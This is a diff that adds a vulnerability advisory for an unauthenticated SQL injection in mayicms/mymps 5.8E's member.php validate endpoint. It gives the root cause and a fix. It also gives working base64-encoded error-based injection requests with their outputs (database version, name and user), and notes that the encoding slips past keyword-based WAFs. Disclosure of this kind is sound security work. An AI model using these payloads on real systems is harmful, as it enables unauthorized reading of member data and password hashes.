@@ -1,0 +1,36 @@
+# mayicms 5.8E member.php?mod=validate base64-decoded Unauthenticated SQL Injection
+
+Product: mayicms / mymps (马蚁分类信息系统) 5.8E and earlier
+Endpoint: GET /member.php?mod=validate&code=<base64(payload)>
+CWE-89
+
+## Root cause
+member.php case 'validate': base64_decode($code) → explode('.') → $uid not
+intval()'d, concatenated into WHERE id='$uid'. Global maddslashes applies to
+base64 text (no quotes in alphabet) so it is a no-op.
+
+## PoC (read-only, live-verified 2026-10-26)
+
+Step 1 - confirm injection (code = base64("1'") = MSc=):
+GET /member.php?mod=validate&code=MSc%3D
+→ 1064 SQL syntax error
+
+Step 2 - extract DB version (plaintext payload, then base64):
+  1' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)-- -
+base64: MScgQU5EIFVQREFURVhNTCgxLENPTkNBVCgweDdlLEBAdmVyc2lvbiwweDdlKSwxKS0tIC0=
+GET /member.php?mod=validate&code=MScgQU5EIFVQREFURVhNTCgxLENPTkNBVCgweDdlLEBAdmVyc2lvbiwweDdlKSwxKS0tIC0%3D
+→ XPATH syntax error: '~5.7.26~'
+
+database() → '~pchui~'   user() → '~root@localhost~'
+
+## Impact
+Unauthenticated read of member table (userpwd hashes). Payload travels
+base64-encoded so plaintext SQL keywords never appear in HTTP traffic,
+defeating keyword-based WAFs.
+
+## Distinct from CVE-2025-4514
+That CVE covers /javascript.php `value` parameter. This is member.php
+`code` parameter on a separate code path (mod=validate). Different file,
+different parameter, unauthenticated. Not a duplicate.
+
+Fix: intval() the decoded uid, use prepared statements.
